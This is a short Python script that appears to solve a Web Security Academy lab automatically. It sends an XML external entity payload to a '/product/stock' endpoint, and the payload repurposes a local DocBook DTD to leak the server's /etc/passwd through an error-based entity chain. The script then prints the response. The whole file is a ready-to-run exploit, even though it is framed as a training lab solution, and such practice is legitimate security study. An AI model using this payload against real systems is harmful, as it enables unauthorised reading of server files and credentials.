from web_security_academy.core.utils import *
from lxml import etree


def solve_lab(session):
    path = "/product/stock"

    doctype = [
        "<!DOCTYPE foo [",
        '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">',
        "<!ENTITY % ISOamso '",
        '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">',
        '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">',
        "&#x25;eval;",
        "&#x25;error;",
        "'>",
        "%local_dtd;",
        "]>",
    ]

    doctype = " ".join(doctype)
    stock_check = etree.Element("stockCheck")
    etree.SubElement(stock_check, "productId").text = "1"
    etree.SubElement(stock_check, "storeId").text = "1"

    data = etree.tostring(
        stock_check, encoding="UTF-8", xml_declaration=True, doctype=doctype
    )
    data = data.decode()

    print_info(
        f'Injecting an XML external entity with the following POST request data to "{path}":\n'
    )
    print(f"{data}\n")

    resp = session.post_path(path, data=data)
    print_success("XXE injection successful with the following response:\n")
    print(f"{resp.text}\n")
